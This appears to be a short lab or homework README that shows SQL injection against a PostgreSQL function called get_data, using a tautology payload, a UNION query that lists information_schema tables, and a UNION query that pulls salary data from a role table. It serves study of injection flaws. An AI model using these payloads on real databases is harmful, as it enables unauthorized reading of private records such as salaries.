![1](https://user-images.githubusercontent.com/56599282/209482379-8fe47dcb-e2c4-436c-9b0d-7e48a2433dff.png)

```sql
select * from get_data('Sidorov');
```  

![2](https://user-images.githubusercontent.com/56599282/209482395-da2c87e1-c8a1-4b8a-aacb-1885a712c754.png)

```sql
select * from get_data('any'' or 1=1 -- ');
```  

![3](https://user-images.githubusercontent.com/56599282/209482516-30fee73f-2f9f-4785-99e9-cd314d32ae9d.png)

```sql
select *
from get_data('1'' union select -1,cast(table_name as varchar),0 from information_schema.tables -- ');
``` 

![4](https://user-images.githubusercontent.com/56599282/209482519-f6825db8-8e0c-4004-92c4-7f216f80b568.png)
 
```sql
select *
from get_data('Sidorov'' union select -1, role_name, salary from role2employer --');
```  

![5](https://user-images.githubusercontent.com/56599282/209482522-ba63c557-b4bc-4f13-93f8-79c7b5304289.png)
